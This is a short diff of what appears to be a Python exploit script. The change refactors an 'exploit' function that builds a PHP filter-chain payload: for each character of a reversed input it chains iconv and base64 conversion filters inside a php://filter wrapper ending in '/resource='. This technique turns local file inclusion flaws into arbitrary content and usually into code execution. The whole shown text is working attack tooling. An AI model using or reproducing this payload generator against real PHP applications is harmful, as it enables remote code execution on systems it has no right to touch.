@@ -65,18 +65,17 @@ c={
 }
 
 
-def exploit(payload):
-    tmp=''
-    payload_prefix='php://filter/convert.iconv.UTF8.UTF7|'
-    payload_suffix='convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource='
+def exploit(payload:str) -> str:
+    NewPayload=''
+    PayloadPrefix='php://filter/convert.iconv.UTF8.UTF7|'
+    PayloadSuffix='convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource='
 
-    tmp+=payload_prefix
     for i in payload[::-1]:
-        tmp+=c[i]
-        tmp+='|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|'
+        NewPayload+=c[i]
+        NewPayload+='|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|'
 
-    tmp+=payload_suffix
-    return tmp
+    NewPayload=PayloadPrefix+NewPayload+PayloadSuffix
+    return NewPayload
 
 
 def main():
